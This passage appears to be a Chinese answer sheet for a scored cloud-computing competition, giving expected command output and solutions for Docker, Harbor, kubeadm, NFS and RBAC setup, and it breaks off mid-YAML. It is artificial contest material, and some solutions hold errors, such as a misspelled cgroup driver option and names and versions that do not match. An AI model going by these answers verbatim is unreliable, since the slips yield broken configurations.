<h3 id="7-设置免密登录"><a href="#7-设置免密登录" class="headerlink" title="7.设置免密登录"></a>7.设置免密登录</h3><p>为四台服务器设置免密登录，保证服务器之间能够互相免密登录。</p>
<p>在 master 节点将 ssh node1 命令的返回结果提交到答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# ssh node1</span><br><span class="line">Last login: Mon Mar 13 23:49:45 2023 from 192.168.157.1</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# ssh-keygen</span><br><span class="line">-&gt; 直接回车即可</span><br><span class="line">[root@master ~]# ssh-copy-id root@node1</span><br><span class="line">[root@master ~]# ssh-copy-id root@node2</span><br><span class="line">[root@master ~]# ssh-copy-id root@harbor</span><br></pre></td></tr></table></figure>

<h2 id="任务-2-k8s-搭建任务（15-分）"><a href="#任务-2-k8s-搭建任务（15-分）" class="headerlink" title="任务 2 k8s 搭建任务（15 分）"></a><strong>任务 2 k8s 搭建任务（15 分）</strong></h2><h3 id="1-安装-docker-应用"><a href="#1-安装-docker-应用" class="headerlink" title="1.安装 docker 应用"></a>1.安装 docker 应用</h3><p>在所有节点上安装 dokcer-ce,并设置为开机自启动。</p>
<p>在 master 节点请将 docker version 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           19.03.13</span><br><span class="line"> API version:       1.40</span><br><span class="line"> Go version:        go1.13.15</span><br><span class="line"> Git commit:        4484c46d9d</span><br><span class="line"> Built:             Wed Sep 16 17:03:45 2020</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Experimental:      <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          19.03.13</span><br><span class="line">  API version:      1.40 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.13.15</span><br><span class="line">  Git commit:       4484c46d9d</span><br><span class="line">  Built:            Wed Sep 16 17:02:21 2020</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     <span class="literal">false</span></span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.3.7</span><br><span class="line">  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.0.0-rc10</span><br><span class="line">  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.18.0</span><br><span class="line">  GitCommit:        fec3683</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">##所有节点</span></span><br><span class="line">[root@master ~]# yum install -y docker-ce</span><br><span class="line">[root@master ~]# systemctl <span class="built_in">enable</span> docker --now</span><br></pre></td></tr></table></figure>

<h3 id="2-安装-docker-应用"><a href="#2-安装-docker-应用" class="headerlink" title="2.安装 docker 应用"></a>2.安装 docker 应用</h3><p>所有节点配置阿里云镜像加速地址(<a href="https://5twf62k1.mirror.aliyuncs.com)并把启动引擎/">https://5twf62k1.mirror.aliyuncs.com)并把启动引擎</a></p>
<p>设置为 systemd，配置成功重启 docker 服务。</p>
<p>请将 json 文件中的内容提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@node1 ~]# <span class="built_in">cat</span> /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://5twf62k1.mirror.aliyuncs.com&quot;</span>],</span><br><span class="line">  <span class="string">&quot;exec-opts&quot;</span>: [<span class="string">&quot;native.cgroupdriver=systemd&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# <span class="built_in">cat</span> /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://5twf62k1.mirror.aliyuncs.com&quot;</span>],</span><br><span class="line">  <span class="string">&quot;exec-opts&quot;</span>: [<span class="string">&quot;native.vgroupdriver=systemd&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[root@node1 ~]# systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="3-安装-docker-compose"><a href="#3-安装-docker-compose" class="headerlink" title="3.安装 docker-compose"></a>3.安装 docker-compose</h3><p>在 Harbor 节点创建目录&#x2F;opt&#x2F;paas,并把 bricsskills_cloud_paas.iso，挂载到&#x2F;opt&#x2F;paas 目录下，</p>
<p>使 用 &#x2F;opt&#x2F;paas&#x2F;docker-compose&#x2F;v1.25.5-docker-compose-Linux-x86_64 </p>
<p>文 件 安 装docker-compose。安装完成后执行 docker-compose version 命令。</p>
<p>请将 docker-compose version 命令返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost paas]# docker-compose version</span><br><span class="line">docker-compose version 1.25.5, build 8a1c60f6</span><br><span class="line">docker-py version: 4.1.0</span><br><span class="line">CPython version: 3.7.5</span><br><span class="line">OpenSSL version: OpenSSL 1.1.0l  10 Sep 2019</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在 Harbor 节点创建目录/opt/paas,并把 bricsskills_cloud_paas.iso，挂载到/opt/paas 目录下</span></span><br><span class="line">[root@harbor paas]# <span class="built_in">cp</span> -p v1.25.5-docker-compose-Linux-x86_64 /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h3 id="4-搭建-horbor-仓库"><a href="#4-搭建-horbor-仓库" class="headerlink" title="4.搭建 horbor 仓库"></a>4.搭建 horbor 仓库</h3><p>在 Harbor 节点使用&#x2F;opt&#x2F;paas&#x2F;harbor&#x2F; harbor-offline-installer-v2.1.0.tgz 离线安装包，安装</p>
<p>harbor 仓库，并修改各节点默认 docker 仓库为 harbor 仓库地址。</p>
<p>在 master 节点请将 docker login harbor private ip 命令的返回结果提交到答题框。【1</p>
<p>分</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# docker login 192.168.157.43</span><br><span class="line">Username: admin</span><br><span class="line">Password:</span><br><span class="line">Error response from daemon: Get http://harbor/v2/: dial tcp 192.168.157.43:80: connect: connection refused</span><br><span class="line">[root@master ~]# docker login harbor</span><br><span class="line">Username: admin</span><br><span class="line">Password:</span><br><span class="line">WARNING! Your password will be stored unencrypted <span class="keyword">in</span> /root/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/#credentials-store</span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#所有节点添加harbor地址</span></span><br><span class="line">[root@master ~]# <span class="built_in">cat</span> /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://5twf62k1.mirror.aliyuncs.com&quot;</span>],</span><br><span class="line">  <span class="string">&quot;insecure-registries&quot;</span>: [<span class="string">&quot;192.168.157.43&quot;</span>],</span><br><span class="line">  <span class="string">&quot;exec-opts&quot;</span>: [<span class="string">&quot;native.cgroupdriver=systemd&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#解压压缩包</span></span><br><span class="line">[root@harbor paas]# tar -zxvf harbor-offline-installer-v2.1.0.tgz</span><br><span class="line">[root@harbor harbor]# <span class="built_in">cp</span> -p harbor.yml.tmpl harbor.yml</span><br><span class="line">hostname: 192.168.157.43</span><br><span class="line"><span class="comment">#https:</span></span><br><span class="line">  <span class="comment"># https port for harbor, default is 443</span></span><br><span class="line"><span class="comment">#  port: 443</span></span><br><span class="line">  <span class="comment"># The path of cert and key files for nginx</span></span><br><span class="line"><span class="comment">#  certificate: /your/certificate/path</span></span><br><span class="line"><span class="comment">#  private_key: /your/private/key/path</span></span><br><span class="line"></span><br><span class="line">[root@harbor harbor]# ./prepare</span><br><span class="line">[root@harbor harbor]# ./install.sh</span><br></pre></td></tr></table></figure>

<h3 id="5-上传-docker-镜像"><a href="#5-上传-docker-镜像" class="headerlink" title="5.上传 docker 镜像"></a>5.上传 docker 镜像</h3><p>在 master 节点使用命令将&#x2F;opt&#x2F;paas&#x2F;images 目录下所有镜像导入本地。然后使用</p>
<p>&#x2F;opt&#x2F;paas&#x2F;k8s_image_push.sh 将所有镜像上传至 docker 仓库。</p>
<p>在master 节点请将 docker images | grep wordpress命令的返回结果提交到答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master paas]# docker images | grep wordpress</span><br><span class="line">wordpress                                                         latest              1b83fad37165        2 years ago         546MB</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master images]# <span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">ls</span> /opt/paas/images|grep tar); <span class="keyword">do</span>   docker load -i /opt/paas/images/<span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">[root@master images]# ../k8s_image_push.sh</span><br></pre></td></tr></table></figure>

<h3 id="6-安装-kubeadm-工具"><a href="#6-安装-kubeadm-工具" class="headerlink" title="6.安装 kubeadm 工具"></a>6.安装 kubeadm 工具</h3><p>在 master 节点、node1 节点、node2 节点分别安装 Kubeadm 工具并设置为开机自启动。</p>
<p>在 master 节点请将 kubeadm version 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master images]# kubeadm version</span><br><span class="line">kubeadm version: &amp;version.Info&#123;Major:<span class="string">&quot;1&quot;</span>, Minor:<span class="string">&quot;18&quot;</span>, GitVersion:<span class="string">&quot;v1.18.1&quot;</span>, GitCommit:<span class="string">&quot;7879fc12a63337efff607952a323df90cdc7a335&quot;</span>, GitTreeState:<span class="string">&quot;clean&quot;</span>, BuildDate:<span class="string">&quot;2020-04-08T17:36:32Z&quot;</span>, GoVersion:<span class="string">&quot;go1.13.9&quot;</span>, Compiler:<span class="string">&quot;gc&quot;</span>, Platform:<span class="string">&quot;linux/amd64&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master images]# yum install -y kubeadm kubelet kubectl</span><br><span class="line">[root@master images]# systemctl <span class="built_in">enable</span> kubelet --now</span><br></pre></td></tr></table></figure>

<h3 id="7-初始化-master-节点"><a href="#7-初始化-master-节点" class="headerlink" title="7.初始化 master 节点"></a>7.初始化 master 节点</h3><p>使用 kubeadm 命令生成 yaml 文件，并修改 yaml 文件，设置 kubernetes 虚拟内部网段地</p>
<p>址为 10.244.0.0&#x2F;16，通过该 yaml 文件初始化 master 节点，然后使用 kube-flannel.yaml 完成</p>
<p>控制节点初始化设置。</p>
<p>在 master 节点的 kube-flannel.yaml 执行前将 kubectl get nodes 命令的返回结果提交</p>
<p>到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# kubectl get nodes</span><br><span class="line">NAME     STATUS     ROLES    AGE     VERSION</span><br><span class="line">master   NotReady   master   5m57s   v1.18.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成yaml文件</span></span><br><span class="line">[root@master ~]# kubeadm config <span class="built_in">print</span> init-defaults  &gt; kubeadm-config.yaml</span><br><span class="line">apiVersion: kubeadm.k8s.io/v1beta2</span><br><span class="line">bootstrapTokens:</span><br><span class="line">- <span class="built_in">groups</span>:</span><br><span class="line">  - system:bootstrappers:kubeadm:default-node-token</span><br><span class="line">  token: abcdef.0123456789abcdef</span><br><span class="line">  ttl: 24h0m0s</span><br><span class="line">  usages:</span><br><span class="line">  - signing</span><br><span class="line">  - authentication</span><br><span class="line">kind: InitConfiguration</span><br><span class="line">localAPIEndpoint:</span><br><span class="line">  advertiseAddress: 192.168.200.3     <span class="comment"># 本机IP</span></span><br><span class="line">  bindPort: 6443</span><br><span class="line">nodeRegistration:</span><br><span class="line">  criSocket: /var/run/dockershim.sock</span><br><span class="line">  name: master1        <span class="comment"># 本主机名</span></span><br><span class="line">  taints:</span><br><span class="line">  - effect: NoSchedule</span><br><span class="line">    key: node-role.kubernetes.io/master</span><br><span class="line">---</span><br><span class="line">apiServer:</span><br><span class="line">  timeoutForControlPlane: 4m0s</span><br><span class="line">apiVersion: kubeadm.k8s.io/v1beta2</span><br><span class="line">certificatesDir: /etc/kubernetes/pki</span><br><span class="line">clusterName: kubernetes</span><br><span class="line">controlPlaneEndpoint: <span class="string">&quot;192.168.200.16:16443&quot;</span>    <span class="comment"># 虚拟IP和haproxy端口</span></span><br><span class="line">controllerManager: &#123;&#125;</span><br><span class="line">dns:</span><br><span class="line">  <span class="built_in">type</span>: CoreDNS</span><br><span class="line">etcd:</span><br><span class="line">  <span class="built_in">local</span>:</span><br><span class="line">    dataDir: /var/lib/etcd</span><br><span class="line">imageRepository: k8s.gcr.io    <span class="comment"># 镜像仓库源要根据自己实际情况修改</span></span><br><span class="line">kind: ClusterConfiguration</span><br><span class="line">kubernetesVersion: v1.18.2     <span class="comment"># k8s版本</span></span><br><span class="line">networking:</span><br><span class="line">  dnsDomain: cluster.local</span><br><span class="line">  podSubnet: <span class="string">&quot;10.244.0.0/16&quot;</span></span><br><span class="line">  serviceSubnet: 10.96.0.0/12</span><br><span class="line">scheduler: &#123;&#125;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">apiVersion: kubeproxy.config.k8s.io/v1alpha1</span><br><span class="line">kind: KubeProxyConfiguration</span><br><span class="line">featureGates:</span><br><span class="line">  SupportIPVSProxyMode: <span class="literal">true</span></span><br><span class="line">mode: ipvs</span><br><span class="line"></span><br><span class="line">[root@master ~]# kubeadm init --config kubeadm-config.yaml</span><br><span class="line"></span><br><span class="line">[root@master ~]# <span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">[root@master ~]# <span class="built_in">sudo</span> <span class="built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="variable">$HOME</span>/.kube/config</span><br><span class="line">[root@master ~]# <span class="built_in">sudo</span> <span class="built_in">chown</span> $(<span class="built_in">id</span> -u):$(<span class="built_in">id</span> -g) <span class="variable">$HOME</span>/.kube/config</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="8-删除污点"><a href="#8-删除污点" class="headerlink" title="8.删除污点"></a>8.删除污点</h3><p>使用命令删除 master 节点的污点，使得 Pod 也可以调度到 master 节点上。</p>
<p>在 master 节点请将 kubectl get nodes -o yaml master | grep -A10 spec 命令的返回结果提</p>
<p>交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master paas]#  kubectl get nodes -o yaml master | grep -A10 spec</span><br><span class="line">      f:spec:</span><br><span class="line">        f:taints: &#123;&#125;</span><br><span class="line">    manager: kube-controller-manager</span><br><span class="line">    operation: Update</span><br><span class="line">    <span class="keyword">time</span>: <span class="string">&quot;2023-03-14T05:56:43Z&quot;</span></span><br><span class="line">  name: master</span><br><span class="line">  resourceVersion: <span class="string">&quot;2383&quot;</span></span><br><span class="line">  selfLink: /api/v1/nodes/master</span><br><span class="line">  uid: abca28aa-3941-436f-ad5f-db5e12cbcaab</span><br><span class="line">spec:</span><br><span class="line">  taints:</span><br><span class="line">  - effect: NoSchedule</span><br><span class="line">    key: node.kubernetes.io/not-ready</span><br><span class="line">  - effect: NoExecute</span><br><span class="line">    key: node.kubernetes.io/not-ready</span><br><span class="line">    timeAdded: <span class="string">&quot;2023-03-14T05:56:43Z&quot;</span></span><br><span class="line">status:</span><br><span class="line">  addresses:</span><br><span class="line">  - address: 192.168.157.40</span><br><span class="line">    <span class="built_in">type</span>: InternalIP</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master paas]# kubectl taint nodes master node-role.kubernetes.io/master-</span><br></pre></td></tr></table></figure>

<h3 id="9-安装-kubernetes-网络插件"><a href="#9-安装-kubernetes-网络插件" class="headerlink" title="9.安装 kubernetes 网络插件"></a>9.安装 kubernetes 网络插件</h3><p>使用 kube-flannel.yaml 安装 kubernetes 网络插件，安装完成后使用命令查看节点状态。</p>
<p>在 master 节点请将 kubectl get nodes 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master yaml]# kubectl get nodes</span><br><span class="line">NAME     STATUS   ROLES    AGE   VERSION</span><br><span class="line">master   Ready    master   15m   v1.18.1</span><br><span class="line">root@master paas]# <span class="built_in">cd</span> yaml/</span><br><span class="line">[root@master yaml]# <span class="built_in">ls</span></span><br><span class="line">dashboard  flannel</span><br><span class="line">[root@master yaml]# kubectl apply -f flannel/kube-flannel.yaml</span><br></pre></td></tr></table></figure>

<h3 id="10-给-kubernetes-创建证书。"><a href="#10-给-kubernetes-创建证书。" class="headerlink" title="10.给 kubernetes 创建证书。"></a>10.给 kubernetes 创建证书。</h3><p> 在 master 节点请将 kubectl get csr 命令的返回结果提交到答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master paas]# kubectl get csr</span><br><span class="line">NAME        AGE   SIGNERNAME                                    REQUESTOR            CONDITION</span><br><span class="line">csr-w6k9j   16m   kubernetes.io/kube-apiserver-client-kubelet   system:node:master   Approved,Issued</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="11-kubernetes-图形化界面的安装"><a href="#11-kubernetes-图形化界面的安装" class="headerlink" title="11.kubernetes 图形化界面的安装"></a>11.kubernetes 图形化界面的安装</h3><p>使用 recommended.yaml 和 dashboard-adminuser.yaml 安装 kubernetes dashboard 界面，</p>
<p>完成后查看首页。</p>
<p>请将 kubectl get pod,svc -n kubernetes-dashboard 命令的返回结果提交到答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> dashboard-certs</span><br><span class="line"><span class="built_in">cd</span> dashboard-certs/</span><br><span class="line"></span><br><span class="line">kubectl create namespace kubernetes-dashboard</span><br><span class="line">openssl genrsa -out dashboard.key 2048</span><br><span class="line">openssl req -days 36000 -new -out dashboard.csr -key dashboard.key -subj <span class="string">&#x27;/CN=dashboard-cert&#x27;</span></span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> dashboard.csr -signkey dashboard.key -out dashboard.crt</span><br><span class="line">kubectl create secret generic kubernetes-dashboard-certs --from-file=dashboard.key --from-file=dashboard.crt -n kubernetes-dashboard</span><br><span class="line"></span><br><span class="line"><span class="comment">##安装dashboard</span></span><br><span class="line">kubectl apply -f recommended.yaml </span><br><span class="line"><span class="comment">#查看状态</span></span><br><span class="line">kubectl get pod,svc -n kubernetes-dashboard</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"> kubectl apply -f dashboard-adminuser.yaml </span><br><span class="line"> </span><br><span class="line"> <span class="comment">#获取token</span></span><br></pre></td></tr></table></figure>

<h3 id="12-扩展计算节点"><a href="#12-扩展计算节点" class="headerlink" title="12.扩展计算节点"></a>12.扩展计算节点</h3><p>在 node1 节点和 node2 节点分别使用 kubeadm config 命令生成 yaml 文件，并通过 yaml</p>
<p>文件将 node 节点加入 kubernetes 集群。完成后在 master 节点上查看所有节点状态。在 master 节点请将 kubectl get nodes 命令的返回结果提交到答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master nfs]# kubectl get nodes</span><br><span class="line">NAME     STATUS   ROLES    AGE    VERSION</span><br><span class="line">master   Ready    master   5d9h   v1.19.0</span><br><span class="line">node1    Ready    &lt;none&gt;   5d9h   v1.19.0</span><br><span class="line">node2    Ready    &lt;none&gt;   5d9h   v1.19.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubeadm config <span class="built_in">print</span> join-defaults &gt; kubeadm-config.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">##然后把相应token修改即可</span></span><br></pre></td></tr></table></figure>





<h2 id="任务-3-EFK-日志平台构建（15-分）"><a href="#任务-3-EFK-日志平台构建（15-分）" class="headerlink" title="任务 3 EFK 日志平台构建（15 分）"></a><strong>任务 3 EFK 日志平台构建（15 分）</strong></h2><h3 id="1-导入镜像"><a href="#1-导入镜像" class="headerlink" title="1.导入镜像"></a>1.导入镜像</h3><p>将提供的 efk-img.tar.gz 压缩包中的镜像导入到 master 节点，并使用命令将镜像上传至</p>
<p>haboor 镜像仓库中。</p>
<p>在master节点将docker images | grep elasticsearch命令的返回结果提交到答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="2-NFS-配置网段访问"><a href="#2-NFS-配置网段访问" class="headerlink" title="2.NFS 配置网段访问"></a>2.NFS 配置网段访问</h3><p>在 master 节点、node1 节点、node2 节点分别安装 nfs 服务， </p>
<p>master 节点作为服务端，把&#x2F;data&#x2F;volume1 目录作为共享目录，只允许 192.168.10 网段访问。</p>
<p>在 master 节点，将 showmount –e 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# showmount -e</span><br><span class="line">Export list <span class="keyword">for</span> master:</span><br><span class="line">/data/volume1 192.168.157.0/24</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#所有节点</span></span><br><span class="line">[root@node1 ~]# yum install -y nfs-utils</span><br><span class="line">[root@master ~]# <span class="built_in">cat</span> /etc/exports</span><br><span class="line">/data/volume1 192.168.157.0/24(rw)</span><br></pre></td></tr></table></figure>

<h3 id="3-RBAC-配置"><a href="#3-RBAC-配置" class="headerlink" title="3.RBAC 配置"></a>3.RBAC 配置</h3><p>在 master 节点，编写 sa.yaml，创建名称为 nfs-provisioner 的 SA 账号。</p>
<p>将 kubectl get serviceaccounts -n kube-logging 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master rbac]# kubectl get serviceaccounts -n kube-logging</span><br><span class="line">NAME              SECRETS   AGE</span><br><span class="line">default           1         23s</span><br><span class="line">nfs-provisioner   1         14s</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@master ~]# <span class="built_in">mkdir</span> rbac</span><br><span class="line">[root@master ~]# <span class="built_in">cd</span> rbac/</span><br><span class="line">[root@master rbac]# vi sa.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: nfs-client-provisioner</span><br><span class="line">  namespace: kube-logging</span><br><span class="line">[root@master rbac]# kubectl create ns  kube-logging</span><br><span class="line">[root@master rbac]# kubectl apply -f sa.yaml</span><br></pre></td></tr></table></figure>

<h3 id="4-RBAC-配置"><a href="#4-RBAC-配置" class="headerlink" title="4.RBAC 配置"></a>4.RBAC 配置</h3><p>编写 rbac.yaml ，对创建的 sa 账号进行 RBAC 授权，基于 yaml 文件创建完成后使用命令分别查看 sa 账号和 rbac 授权信息。</p>
<p>将 kubectl get roles.rbac.authorization.k8s.io 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@master rbac]# kubectl get roles.rbac.authorization.k8s.io</span><br><span class="line">NAME                     CREATED AT</span><br><span class="line">leader-nfs-provisioner   2023-03-14T09:04:04Z</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kind: ClusterRole</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">metadata:</span><br><span class="line">  name: nfs-client-provisioner-runner</span><br><span class="line">rules:</span><br><span class="line">  - apiGroups: [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    resources: [<span class="string">&quot;nodes&quot;</span>]</span><br><span class="line">    verbs: [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>]</span><br><span class="line">  - apiGroups: [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    resources: [<span class="string">&quot;persistentvolumes&quot;</span>]</span><br><span class="line">    verbs: [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;delete&quot;</span>]</span><br><span class="line">  - apiGroups: [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    resources: [<span class="string">&quot;persistentvolumeclaims&quot;</span>]</span><br><span class="line">    verbs: [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;update&quot;</span>]</span><br><span class="line">  - apiGroups: [<span class="string">&quot;storage.k8s.io&quot;</span>]</span><br><span class="line">    resources: [<span class="string">&quot;storageclasses&quot;</span>]</span><br><span class="line">    verbs: [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>]</span><br><span class="line">  - apiGroups: [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    resources: [<span class="string">&quot;events&quot;</span>]</span><br><span class="line">    verbs: [<span class="string">&quot;create&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;patch&quot;</span>]</span><br><span class="line">---</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">metadata:</span><br><span class="line">  name: run-nfs-client-provisioner</span><br><span class="line">subjects:</span><br><span class="line">  - kind: ServiceAccount</span><br><span class="line">    name: nfs-client-provisioner</span><br><span class="line">    namespace: kube-logging</span><br><span class="line">roleRef:</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: nfs-client-provisioner-runner</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">---</span><br><span class="line">kind: Role</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">metadata:</span><br><span class="line">  name: leader-locking-nfs-client-provisioner</span><br><span class="line">  namespace: kube-logging</span><br><span class="line">rules:</span><br><span class="line">  - apiGroups: [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    resources: [<span class="string">&quot;endpoints&quot;</span>]</span><br><span class="line">    verbs: [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;patch&quot;</span>]</span><br><span class="line">---</span><br><span class="line">kind: RoleBinding</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">metadata:</span><br><span class="line">  name: leader-locking-nfs-client-provisioner</span><br><span class="line">  namespace: kube-logging</span><br><span class="line">subjects:</span><br><span class="line">  - kind: ServiceAccount</span><br><span class="line">    name: nfs-client-provisioner</span><br><span class="line">    namespace: kube-logging</span><br><span class="line">roleRef:</span><br><span class="line">  kind: Role</span><br><span class="line">  name: leader-locking-nfs-client-provisioner</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br></pre></td></tr></table></figure>



<h3 id="5-StorageClass-动态绑定"><a href="#5-StorageClass-动态绑定" class="headerlink" title="5.StorageClass 动态绑定"></a>5.StorageClass 动态绑定</h3><p>编写 nfs-deploy.yaml 文件，基于 nfs-client-provisioner 镜像创建 nfs-provisioner 的</p>
<p>deployment 对象，绑定 nfs 服务端的共享目录。</p>
<p>将 kubectl get pods 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master rbac]# kubectl get pod</span><br><span class="line">nfs-deploy-754d9b668c-chhqx       2/2     Running       1          9s</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master nfs]# <span class="built_in">cat</span> nfs-deployment.yaml</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: nfs-client-provisioner</span><br><span class="line">  labels:</span><br><span class="line">    app: nfs-client-provisioner</span><br><span class="line">  namespace: kube-logging</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  strategy:</span><br><span class="line">    <span class="built_in">type</span>: Recreate</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: nfs-client-provisioner</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: nfs-client-provisioner</span><br><span class="line">    spec:</span><br><span class="line">      nodeName: master   <span class="comment">#设置在master节点运行</span></span><br><span class="line">      serviceAccountName: nfs-client-provisioner</span><br><span class="line">      containers:</span><br><span class="line">        - name: nfs-client-provisioner</span><br><span class="line">          image: 